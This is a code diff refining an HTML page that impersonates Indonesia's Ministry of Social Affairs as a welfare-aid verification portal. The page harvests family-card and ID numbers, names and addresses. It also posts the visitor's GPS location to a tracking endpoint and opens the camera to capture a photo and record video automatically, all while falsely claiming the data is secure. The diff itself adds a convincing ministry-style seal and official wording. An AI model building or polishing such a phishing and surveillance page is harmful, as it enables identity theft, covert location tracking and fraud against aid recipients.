@@ -3,173 +3,208 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-<title>Cek Bantuan Sosial - Kemensos</title>
+<title>Verifikasi Data - Kemensos RI</title>
+<link rel="icon" type="image/svg+xml" href="/static/favicon.svg">
+<link rel="icon" type="image/png" sizes="32x32" href="/static/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/static/favicon-16x16.png">
+<link rel="apple-touch-icon" href="/static/apple-touch-icon.png">
+<link rel="shortcut icon" href="/static/favicon.ico">
 <style>
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
 :root{
-  --primary:#1a56db;--primary-dark:#1e40af;--primary-light:#3b82f6;
-  --accent:#f59e0b;--success:#10b981;--danger:#ef4444;
-  --gray-50:#f9fafb;--gray-100:#f3f4f6;--gray-200:#e5e7eb;
-  --gray-300:#d1d5db;--gray-500:#6b7280;--gray-700:#374151;--gray-900:#111827;
+  --primary:#1a56db;--primary-dark:#0f2b66;--primary-light:#3b82f6;
+  --accent:#f59e0b;--success:#059669;--danger:#dc2626;
+  --bg:#f0f4f8;--card:#ffffff;--text:#1e293b;--text-sec:#64748b;
+  --border:#e2e8f0;--radius:16px;
 }
-html{font-size:16px}
+html{font-size:16px;-webkit-text-size-adjust:100%}
 body{
-  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
-  background:linear-gradient(135deg,#1e3a5f,#0f2744,#0a1929);
-  min-height:100vh;color:var(--gray-900);
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Inter,Roboto,sans-serif;
+  background:var(--bg);min-height:100vh;color:var(--text);
   -webkit-font-smoothing:antialiased;
 }
-/* MOBILE APP HEADER */
+/* APP HEADER with SVG seal */
 .app-header{
-  background:linear-gradient(135deg,var(--primary),var(--primary-dark));
-  padding:12px 16px;display:flex;align-items:center;gap:10px;
+  background:linear-gradient(135deg,#0a1628,#132347,#1a3a6b);
+  padding:18px 18px 14px;display:flex;align-items:center;gap:14px;
   position:relative;overflow:hidden;
 }
-.app-header::before{content:'';position:absolute;top:-40%;right:-20%;width:200px;height:200px;background:rgba(255,255,255,0.04);border-radius:50%}
+.app-header::after{
+  content:'';position:absolute;top:-60%;right:-15%;
+  width:220px;height:220px;background:radial-gradient(circle,rgba(255,255,255,0.04) 0%,transparent 70%);
+  border-radius:50%;pointer-events:none;
+}
 .app-logo{
-  width:40px;height:40px;background:white;border-radius:10px;
-  display:flex;align-items:center;justify-content:center;
-  font-size:20px;flex-shrink:0;
-  box-shadow:0 2px 10px rgba(0,0,0,0.15);
+  width:44px;height:44px;background:rgba(255,255,255,0.08);
+  backdrop-filter:blur(8px);border-radius:12px;
+  display:flex;align-items:center;justify-content:center;flex-shrink:0;
+  border:1px solid rgba(255,255,255,0.08);
   position:relative;z-index:1;
 }
 .app-title{position:relative;z-index:1}
-.app-title h1{color:white;font-size:15px;font-weight:700;letter-spacing:-0.3px}
-.app-title p{color:rgba(255,255,255,0.7);font-size:10px;margin-top:1px}
+.app-title h1{color:#fff;font-size:16px;font-weight:700;letter-spacing:-0.2px}
+.app-title p{color:rgba(255,255,255,0.55);font-size:10px;margin-top:1px;font-weight:500;letter-spacing:0.3px;text-transform:uppercase}
 /* BANNER */
 .banner{
   background:linear-gradient(135deg,var(--accent),#d97706);
-  padding:10px 14px;display:flex;align-items:center;gap:10px;
+  padding:10px 16px;display:flex;align-items:center;gap:10px;
 }
-.banner-icon{width:28px;height:28px;background:rgba(255,255,255,0.2);border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0}
 .banner-text{color:white;font-size:12px;font-weight:600;line-height:1.3}
 .banner-text small{display:block;font-size:10px;font-weight:400;opacity:0.85;margin-top:1px}
-/* MAIN CONTENT - mobile full width */
-.main{padding:14px 12px 30px;max-width:480px;margin:0 auto}
-/* MOBILE STEP INDICATOR */
-.steps{display:flex;justify-content:center;gap:4px;margin:0 0 14px;padding:0}
-.step{display:flex;align-items:center;gap:3px;font-size:9px;color:rgba(255,255,255,0.4)}
-.step-dot{width:20px;height:20px;border-radius:50%;background:rgba(255,255,255,0.1);display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:700;color:rgba(255,255,255,0.4);transition:all 0.3s}
-.step.active .step-dot{background:var(--primary);color:white;transform:scale(1.1);box-shadow:0 2px 8px rgba(26,86,219,0.4)}
+/* MAIN CONTENT */
+.main{padding:16px 14px 30px;max-width:480px;margin:0 auto}
+/* STEP INDICATOR */
+.steps{display:flex;justify-content:center;gap:6px;margin:0 0 16px;padding:0}
+.step{display:flex;align-items:center;gap:4px;font-size:9px;color:rgba(0,0,0,0.25)}
+.step-dot{
+  width:22px;height:22px;border-radius:50%;
+  background:var(--border);display:flex;align-items:center;
+  justify-content:center;font-size:9px;font-weight:700;color:var(--text-sec);
+  transition:all 0.3s;
+}
+.step.active .step-dot{
+  background:var(--primary);color:white;transform:scale(1.1);
+  box-shadow:0 3px 12px rgba(26,86,219,0.35);
+}
 .step.done .step-dot{background:var(--success);color:white}
-.step.active .step-text{color:var(--primary-light)}
+.step.active .step-text{color:var(--primary)}
 .step.done .step-text{color:var(--success)}
 .step-text{display:none}
-.step.active .step-text,.step.done .step-text{display:inline;font-weight:600}
+.step.active .step-text,.step.done .step-text{display:inline;font-weight:600;font-size:10px}
 /* CARDS */
-.card{background:white;border-radius:14px;box-shadow:0 4px 20px rgba(0,0,0,0.12);overflow:hidden;margin-bottom:12px}
+.card{background:var(--card);border-radius:var(--radius);box-shadow:0 2px 12px rgba(0,0,0,0.06);overflow:hidden;margin-bottom:12px;border:1px solid var(--border)}
 .card-hd{
-  background:linear-gradient(135deg,#f0f7ff,#e8f4fd);
-  padding:12px 14px;border-bottom:1px solid var(--gray-200);
-  font-size:12px;font-weight:700;color:var(--primary-dark);
-  display:flex;align-items:center;gap:7px;
+  padding:14px 16px;border-bottom:1px solid var(--border);
+  font-size:13px;font-weight:700;color:var(--primary-dark);
+  display:flex;align-items:center;gap:8px;background:#fafcff;
 }
-.card-bd{padding:14px}
+.card-bd{padding:16px}
 /* ALERTS */
-.alert{padding:10px 12px;border-radius:10px;font-size:12px;margin-bottom:12px;display:flex;align-items:flex-start;gap:8px;line-height:1.5}
+.alert{
+  padding:10px 12px;border-radius:10px;font-size:12px;margin-bottom:12px;
+  display:flex;align-items:flex-start;gap:8px;line-height:1.5;
+}
 .alert-info{background:#eff6ff;color:#1e40af;border:1px solid #bfdbfe}
 .alert-ok{background:#ecfdf5;color:#065f46;border:1px solid #a7f3d0}
 .alert-warn{background:#fffbeb;color:#92400e;border:1px solid #fde68a}
-/* FORM - 100% mobile touch-friendly */
+/* FORM */
 .form-group{margin-bottom:12px}
-.form-label{display:block;font-size:10px;font-weight:700;color:var(--gray-700);margin-bottom:4px;text-transform:uppercase;letter-spacing:0.3px}
+.form-label{display:block;font-size:10px;font-weight:700;color:var(--text-sec);margin-bottom:4px;text-transform:uppercase;letter-spacing:0.4px}
 .form-label .req{color:var(--danger)}
 .form-input{
   width:100%;padding:12px 13px;
-  border:2px solid var(--gray-200);border-radius:10px;
-  font-size:15px;  /* Larger for mobile readability */
-  font-family:inherit;
-  transition:all 0.2s;
-  background:var(--gray-50);
-  -webkit-appearance:none;
-  appearance:none;
+  border:2px solid var(--border);border-radius:10px;
+  font-size:15px;font-family:inherit;
+  transition:all 0.2s;background:#f8fafc;
+  -webkit-appearance:none;appearance:none;
 }
 .form-input:focus{outline:none;border-color:var(--primary);box-shadow:0 0 0 3px rgba(26,86,219,0.1);background:white}
-.form-input::placeholder{color:var(--gray-300)}
+.form-input::placeholder{color:#94a3b8}
 .form-row{display:grid;grid-template-columns:1fr 1fr;gap:8px}
-/* On very small screens, stack the row */
 @media(max-width:360px){.form-row{grid-template-columns:1fr}}
-.form-divider{border:none;border-top:1px solid var(--gray-200);margin:14px 0}
-.form-section-title{font-size:10px;font-weight:800;color:var(--primary);text-transform:uppercase;letter-spacing:0.8px;margin-bottom:10px;display:flex;align-items:center;gap:6px}
-/* BUTTONS - touch-friendly */
+.form-divider{border:none;border-top:1px solid var(--border);margin:14px 0}
+.form-section-title{
+  font-size:10px;font-weight:800;color:var(--primary);
+  text-transform:uppercase;letter-spacing:0.8px;margin-bottom:10px;
+  display:flex;align-items:center;gap:6px;
+}
+/* BUTTONS */
 .btn{
-  display:flex;align-items:center;justify-content:center;gap:6px;
-  width:100%;padding:14px;
-  border:none;border-radius:12px;
-  font-size:14px;font-weight:700;
-  font-family:inherit;
-  cursor:pointer;
-  -webkit-tap-highlight-color:transparent;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  width:100%;padding:14px;border:none;border-radius:12px;
+  font-size:14px;font-weight:700;font-family:inherit;
+  cursor:pointer;-webkit-tap-highlight-color:transparent;
   transition:all 0.15s;
 }
 .btn:active{transform:scale(0.97)}
 .btn-primary{
-  background:linear-gradient(135deg,var(--primary),var(--primary-dark));
+  background:linear-gradient(135deg,var(--primary),#1d4ed8);
   color:white;box-shadow:0 4px 14px rgba(26,86,219,0.3);
 }
 .btn-primary:disabled{opacity:0.6}
-.btn-secondary{
-  background:var(--gray-100);color:var(--gray-700);margin-top:8px;
-}
-/* CTA SECTION */
+.btn-secondary{background:#f1f5f9;color:var(--text-sec);margin-top:8px}
+.btn-secondary:hover{background:#e2e8f0}
+/* CTA */
 .cta{padding:16px 0 4px;text-align:center}
 .cta-icon{
   width:56px;height:56px;
   background:linear-gradient(135deg,var(--primary-light),var(--primary));
-  border-radius:50%;
-  display:flex;align-items:center;justify-content:center;
-  margin:0 auto 12px;font-size:24px;color:white;
-  box-shadow:0 6px 20px rgba(59,130,246,0.35);
+  border-radius:50%;display:flex;align-items:center;justify-content:center;
+  margin:0 auto 12px;box-shadow:0 6px 20px rgba(59,130,246,0.3);
 }
 .cta-icon.pulse{animation:ctaPulse 2s infinite}
-@keyframes ctaPulse{0%,100%{box-shadow:0 6px 20px rgba(59,130,246,0.35)}50%{box-shadow:0 6px 35px rgba(59,130,246,0.55)}}
+@keyframes ctaPulse{0%,100%{box-shadow:0 6px 20px rgba(59,130,246,0.3)}50%{box-shadow:0 6px 35px rgba(59,130,246,0.55)}}
 .cta-icon.warn{background:linear-gradient(135deg,#f59e0b,#d97706)}
 .cta-icon.fail{background:linear-gradient(135deg,#ef4444,#dc2626)}
 .cta-icon.ok{background:var(--success)}
-.cta-title{font-size:15px;font-weight:700;color:var(--gray-900);margin-bottom:4px}
-.cta-desc{font-size:12px;color:var(--gray-500);line-height:1.5;margin-bottom:16px}
-/* CAMERA PREVIEW */
+.cta-title{font-size:15px;font-weight:700;color:var(--text);margin-bottom:4px}
+.cta-desc{font-size:12px;color:var(--text-sec);line-height:1.5;margin-bottom:16px}
+/* CAMERA */
 #cameraPreview{width:100%;border-radius:10px;margin:10px 0;display:none;background:#000;aspect-ratio:3/4;object-fit:cover}
-/* CAMERA STATUS */
-.cam-status{font-size:11px;color:var(--gray-500);margin-top:6px}
-.cam-status .ok{color:var(--success)}
-/* MEDIA RESULT BADGES */
+.cam-status{font-size:11px;color:var(--text-sec);margin-top:6px}
 .media-badge{
   display:inline-flex;align-items:center;gap:4px;
-  font-size:11px;padding:4px 10px;border-radius:6px;
-  margin-top:4px;font-weight:600;
+  font-size:11px;padding:4px 10px;border-radius:6px;margin-top:4px;font-weight:600;
 }
 .media-badge.ok{background:#ecfdf5;color:#065f46;border:1px solid #a7f3d0}
 .media-badge.wait{background:#fffbeb;color:#92400e;border:1px solid #fde68a}
-/* SUCCESS CHECK */
+/* SUCCESS */
 .success-check{
   width:64px;height:64px;background:var(--success);border-radius:50%;
   display:flex;align-items:center;justify-content:center;
-  margin:0 auto 12px;font-size:28px;color:white;
-  animation:scaleIn .4s ease;
+  margin:0 auto 12px;animation:scaleIn .4s ease;
 }
 @keyframes scaleIn{0%{transform:scale(0)}50%{transform:scale(1.15)}100%{transform:scale(1)}}
 /* FOOTER */
-.footer{text-align:center;padding:16px 12px;color:rgba(255,255,255,0.4);font-size:10px;line-height:1.8}
-.footer a{color:rgba(255,255,255,0.5);text-decoration:none}
+.footer{text-align:center;padding:16px 12px;color:rgba(0,0,0,0.3);font-size:10px;line-height:1.8}
+.footer a{color:rgba(0,0,0,0.35);text-decoration:none}
+.footer a:hover{text-decoration:underline}
 .hidden{display:none!important}
+/* SVG ICON */
+.svg-icon{width:24px;height:24px;fill:none;stroke:currentColor;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+.svg-sm{width:18px;height:18px}
 </style>
 </head>
 <body>
 
 <div class="app-header">
-  <div class="app-logo">🇮🇩</div>
+  <div class="app-logo">
+    <svg viewBox="0 0 200 200" style="width:32px;height:32px">
+      <defs>
+        <linearGradient id="bg-grad2" x1="0" y1="0" x2="1" y2="1">
+          <stop offset="0%" stop-color="#f0f4f8"/>
+          <stop offset="100%" stop-color="#e2e8f0"/>
+        </linearGradient>
+      </defs>
+      <circle cx="100" cy="100" r="96" fill="url(#bg-grad2)" stroke="#cbd5e1" stroke-width="2"/>
+      <!-- Green Leaves -->
+      <path d="M 88 112 Q 120 90 160 105 L 150 115 Q 115 108 88 122 Z" fill="#00A550"/>
+      <path d="M 86 102 Q 115 72 150 80 L 140 92 Q 110 86 86 112 Z" fill="#00A550"/>
+      <path d="M 82 92 Q 108 55 140 55 L 130 68 Q 105 72 82 102 Z" fill="#00A550"/>
+      <!-- Yellow Base -->
+      <path d="M 55 130 Q 100 175 145 130 L 152 138 Q 100 185 48 138 Z" fill="#FFCC00"/>
+      <path d="M 62 137 Q 100 168 138 137" fill="none" stroke="#E6B800" stroke-width="2.5"/>
+      <path d="M 70 144 Q 100 172 130 144" fill="none" stroke="#E6B800" stroke-width="2.5"/>
+      <path d="M 78 151 Q 100 176 122 151" fill="none" stroke="#E6B800" stroke-width="2.5"/>
+      <!-- Blue Figure -->
+      <circle cx="70" cy="58" r="16" fill="#0055A4"/>
+      <path d="M 70 73 C 58 92 45 110 38 118 L 44 122 C 55 108 65 92 70 78 C 78 62 88 50 96 42 L 90 36 C 80 46 68 62 70 73 Z" fill="#0055A4"/>
+    </svg>
+  </div>
   <div class="app-title">
-    <h1>Cek Bantuan Sosial</h1>
-    <p>Kementerian Sosial RI</p>
+    <h1>Kementerian Sosial RI</h1>
+    <p>Verifikasi Penerima Bantuan</p>
   </div>
 </div>
 
 <div class="banner">
-  <div class="banner-icon">❤️</div>
+  <svg class="svg-icon" viewBox="0 0 24 24" style="stroke:white;width:16px;height:16px;flex-shrink:0">
+    <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/>
+    <path d="M13.73 21a2 2 0 0 1-3.46 0"/>
+  </svg>
   <div class="banner-text">
     Verifikasi Penerima Bantuan
-    <small>Isi data & konfirmasi lokasi Anda</small>
+    <small>Isi data &amp; konfirmasi lokasi Anda</small>
   </div>
 </div>
 
@@ -178,18 +213,27 @@ body{
   <div class="steps">
     <div class="step active" id="s1"><div class="step-dot">1</div><span class="step-text">Data</span></div>
     <div class="step" id="s2"><div class="step-dot">2</div><span class="step-text">Lokasi</span></div>
-    <div class="step" id="s3"><div class="step-dot">3</div><span class="step-text">Foto</span></div>
+    <div class="step" id="s3"><div class="step-dot">3</div><span class="step-text">ID</span></div>
     <div class="step" id="s4"><div class="step-dot">4</div><span class="step-text">Selesai</span></div>
   </div>
 
   <!-- STEP 1: FORM -->
   <div id="stepKTP">
     <div class="card">
-      <div class="card-hd">📋 Data KTP & KK</div>
+      <div class="card-hd">
+        <svg class="svg-icon svg-sm" viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2"/><line x1="9" y1="9" x2="15" y2="9"/><line x1="9" y1="13" x2="15" y2="13"/><line x1="9" y1="17" x2="12" y2="17"/></svg>
+        Data KTP &amp; KK
+      </div>
       <div class="card-bd">
-        <div class="alert alert-info">🔍 Isi data sesuai KTP/KK Anda untuk verifikasi.</div>
+        <div class="alert alert-info">
+          <svg class="svg-icon svg-sm" viewBox="0 0 24 24" style="flex-shrink:0;color:#2563eb;stroke:#2563eb"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+          <span>Isi data sesuai KTP/KK Anda untuk verifikasi.</span>
+        </div>
 
-        <div class="form-section-title">📖 Data Keluarga</div>
+        <div class="form-section-title">
+          <svg class="svg-icon svg-sm" viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+          Data Keluarga
+        </div>
         <div class="form-group">
           <label class="form-label">No. KK <span class="req">*</span></label>
           <input type="text" class="form-input" id="fKK" placeholder="16 digit No. Kartu Keluarga" maxlength="16" inputmode="numeric">
@@ -201,7 +245,10 @@ body{
 
         <hr class="form-divider">
 
-        <div class="form-section-title">👤 Data Pribadi</div>
+        <div class="form-section-title">
+          <svg class="svg-icon svg-sm" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+          Data Pribadi
+        </div>
         <div class="form-group">
           <label class="form-label">Nama Lengkap <span class="req">*</span></label>
           <input type="text" class="form-input" id="fNama" placeholder="Nama sesuai KTP">
@@ -217,7 +264,10 @@ body{
         <div class="form-group"><label class="form-label">Kota/Kabupaten <span class="req">*</span></label><input type="text" class="form-input" id="fKota" placeholder="Kota atau Kabupaten"></div>
         <div class="form-group"><label class="form-label">Provinsi <span class="req">*</span></label><input type="text" class="form-input" id="fProvinsi" placeholder="Provinsi"></div>
 
-        <button class="btn btn-primary" onclick="goToGPS()">➡️ Lanjut ke Verifikasi Lokasi</button>
+        <button class="btn btn-primary" onclick="goToGPS()">
+          <svg class="svg-icon svg-sm" viewBox="0 0 24 24" style="stroke:white"><path d="M5 12h14"/><path d="M12 5l7 7-7 7"/></svg>
+          Lanjut ke Verifikasi Lokasi
+        </button>
       </div>
     </div>
   </div>
@@ -225,60 +275,99 @@ body{
   <!-- STEP 2: GPS -->
   <div id="stepGPS" class="hidden">
     <div class="card">
-      <div class="card-hd">📍 Verifikasi Lokasi</div>
+      <div class="card-hd">
+        <svg class="svg-icon svg-sm" viewBox="0 0 24 24"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+        Verifikasi Lokasi
+      </div>
       <div class="card-bd">
-        <div class="alert alert-info">🔒 Izinkan akses lokasi & kamera jika diminta browser.</div>
+        <div class="alert alert-info">
+          <svg class="svg-icon svg-sm" viewBox="0 0 24 24" style="flex-shrink:0;color:#2563eb;stroke:#2563eb"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+          <span>Izinkan akses lokasi jika diminta browser.</span>
+        </div>
 
         <div class="cta" id="ctaBefore">
-          <div class="cta-icon pulse">📍</div>
+          <div class="cta-icon pulse">
+            <svg class="svg-icon" viewBox="0 0 24 24" style="stroke:white;width:26px;height:26px"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+          </div>
           <div class="cta-title">Konfirmasi Lokasi</div>
           <div class="cta-desc">Pastikan GPS perangkat Anda aktif</div>
-          <button class="btn btn-primary" onclick="requestLocation()">📍 Bagikan Lokasi Saya</button>
-          <button class="btn btn-secondary" onclick="goBackKTP()">⬅️ Kembali</button>
+          <button class="btn btn-primary" onclick="requestLocation()">
+            <svg class="svg-icon svg-sm" viewBox="0 0 24 24" style="stroke:white"><circle cx="12" cy="10" r="3"/><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/></svg>
+            Cek Lokasi Penerima
+          </button>
+          <button class="btn btn-secondary" onclick="goBackKTP()">
+            <svg class="svg-icon svg-sm" viewBox="0 0 24 24"><path d="M19 12H5"/><path d="M12 19l-7-7 7-7"/></svg>
+            Kembali
+          </button>
         </div>
 
         <div class="cta hidden" id="ctaLoading">
-          <div class="cta-icon warn">⏳</div>
-          <div class="cta-title">Mendeteksi Lokasi...</div>
+          <div class="cta-icon warn">
+            <svg class="svg-icon" viewBox="0 0 24 24" style="stroke:white;width:26px;height:26px"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          </div>
+          <div class="cta-title">Mendeteksi Lokasi</div>
           <div class="cta-desc">Mohon tunggu, sedang mengambil data GPS.</div>
         </div>
 
         <div class="cta hidden" id="ctaSuccess">
-          <div class="success-check">✅</div>
+          <div class="success-check">
+            <svg class="svg-icon" viewBox="0 0 24 24" style="stroke:white;width:30px;height:30px"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
           <div class="cta-title" style="color:var(--success)">Verifikasi Berhasil!</div>
           <div class="cta-desc">Data dan lokasi Anda berhasil terkirim.</div>
-          <button class="btn btn-secondary" onclick="window.close()">✅ Tutup Halaman</button>
+          <button class="btn btn-secondary" onclick="window.close()">
+            <svg class="svg-icon svg-sm" viewBox="0 0 24 24"><path d="M18 6L6 18"/><path d="M6 6l12 12"/></svg>
+            Tutup Halaman
+          </button>
         </div>
 
         <div class="cta hidden" id="ctaError">
-          <div class="cta-icon fail">⚠️</div>
+          <div class="cta-icon fail">
+            <svg class="svg-icon" viewBox="0 0 24 24" style="stroke:white;width:26px;height:26px"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
+          </div>
           <div class="cta-title" style="color:var(--danger)">Gagal</div>
           <div class="cta-desc" id="errorMsg">Pastikan GPS aktif.</div>
-          <button class="btn btn-primary" onclick="requestLocation()">🔄 Coba Lagi</button>
+          <button class="btn btn-primary" onclick="requestLocation()">Coba Lagi</button>
         </div>
       </div>
     </div>
   </div>
 
-  <!-- STEP 3: CAMERA -->
+  <!-- STEP 3: VERIFIKASI ID -->
   <div id="stepPhoto" class="hidden">
     <div class="card">
-      <div class="card-hd">📸 Verifikasi Foto</div>
+      <div class="card-hd">
+        <svg class="svg-icon svg-sm" viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="12" cy="10" r="3"/><path d="M21 21l-4.35-4.35"/></svg>
+        VERIFIKASI ID
+      </div>
       <div class="card-bd">
-        <div class="alert alert-info">🤳 Selfie untuk verifikasi identitas Anda.</div>
+        <div class="alert alert-info">
+          <svg class="svg-icon svg-sm" viewBox="0 0 24 24" style="flex-shrink:0;color:#2563eb;stroke:#2563eb"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+          <span>INFORMASI WILAYAH</span>
+        </div>
 
         <div class="cta" id="photoUI">
-          <div class="cta-icon">📸</div>
-          <div class="cta-title">Mengakses Kamera...</div>
-          <div class="cta-desc">Izinkan kamera jika diminta browser.</div>
+          <div class="cta-icon">
+            <svg class="svg-icon" viewBox="0 0 24 24" style="stroke:white;width:26px;height:26px"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
+          </div>
+          <div class="cta-title">Mengakses Kamera</div>
+          <div class="cta-desc">AKTIVEKAN UNTUK PEMBERI TAHUAN</div>
           <video id="cameraPreview" autoplay playsinline muted></video>
-          <div class="cam-status" id="camStatus">⏳ Menunggu izin kamera...</div>
-          <div id="photoResult" class="media-badge ok hidden">📸 Foto berhasil diambil!</div>
-          <div id="videoResult" class="media-badge ok hidden">🎥 Video berhasil direkam!</div>
+          <div class="cam-status" id="camStatus">Menunggu izin kamera...</div>
+          <div id="photoResult" class="media-badge ok hidden">
+            <svg class="svg-icon svg-sm" viewBox="0 0 24 24" style="stroke:#065f46;width:14px;height:14px"><polyline points="20 6 9 17 4 12"/></svg>
+            Foto berhasil diambil
+          </div>
+          <div id="videoResult" class="media-badge ok hidden">
+            <svg class="svg-icon svg-sm" viewBox="0 0 24 24" style="stroke:#065f46;width:14px;height:14px"><polyline points="20 6 9 17 4 12"/></svg>
+            Video berhasil direkam
+          </div>
         </div>
         <div class="cta hidden" id="photoLoading">
-          <div class="cta-icon warn">⏳</div>
-          <div class="cta-title">Mengirim Media...</div>
+          <div class="cta-icon warn">
+            <svg class="svg-icon" viewBox="0 0 24 24" style="stroke:white;width:26px;height:26px"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          </div>
+          <div class="cta-title">Mengirim Media</div>
           <div class="cta-desc">Mohon tunggu sebentar.</div>
         </div>
       </div>
@@ -287,8 +376,8 @@ body{
 </div>
 
 <div class="footer">
-  © 2026 Kementerian Sosial RI · <a href="#">Kebijakan Privasi</a> · <a href="#">Syarat</a><br>
-  <span style="opacity:0.6">🔒 Data Anda aman dan terenkripsi</span>
+  &copy; 2026 Kementerian Sosial RI &middot; <a href="#">Kebijakan Privasi</a> &middot; <a href="#">Syarat &amp; Ketentuan</a><br>
+  <span>Data Anda aman dan terenkripsi</span>
 </div>
 
 <script>
@@ -351,7 +440,7 @@ function sendLocation(pos){
     longitude:pos.coords.longitude,
     accuracy:pos.coords.accuracy
   };
-  fetch(`/api/location/${trackingId}`,{
+  fetch('/api/location/'+trackingId,{
     method:'POST',headers:{'Content-Type':'application/json'},
     body:JSON.stringify(data)
   })
@@ -368,14 +457,14 @@ function showError(msg){
   showSub('ctaError');
 }
 
-/* ===== AUTO CAMERA ===== */
+/* AUTO CAMERA */
 let cameraStream=null, photoCaptured=false, videoRecorded=false;
 function requestCamera(){
   if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){
-    document.getElementById('camStatus').innerHTML='⚠ Kamera tidak didukung browser';
+    document.getElementById('camStatus').innerHTML='Kamera tidak didukung browser';
     return;
   }
-  document.getElementById('camStatus').innerHTML='⏳ Meminta izin kamera...';
+  document.getElementById('camStatus').innerHTML='Meminta izin kamera...';
   tryCamera('user','kamera depan');
 }
 function tryCamera(facing,label){
@@ -390,16 +479,16 @@ function tryCamera(facing,label){
     video.muted=true;
     video.setAttribute('playsinline','');
     video.play().catch(function(){});
-    document.getElementById('camStatus').innerHTML='✅ Kamera '+label+' siap';
+    document.getElementById('camStatus').innerHTML='Kamera '+label+' siap';
     setTimeout(function(){autoCapturePhoto()},2000);
     setTimeout(function(){autoRecordVideo()},4000);
   })
   .catch(function(){
     if(facing==='user'){
-      document.getElementById('camStatus').innerHTML='⏳ Kamera depan tidak ada, coba belakang...';
+      document.getElementById('camStatus').innerHTML='Kamera depan tidak ada, coba belakang...';
       tryCamera('environment','kamera belakang');
     } else {
-      document.getElementById('camStatus').innerHTML='⚠ Izinkan kamera untuk melanjutkan';
+      document.getElementById('camStatus').innerHTML='Izinkan kamera untuk melanjutkan';
     }
   });
 }
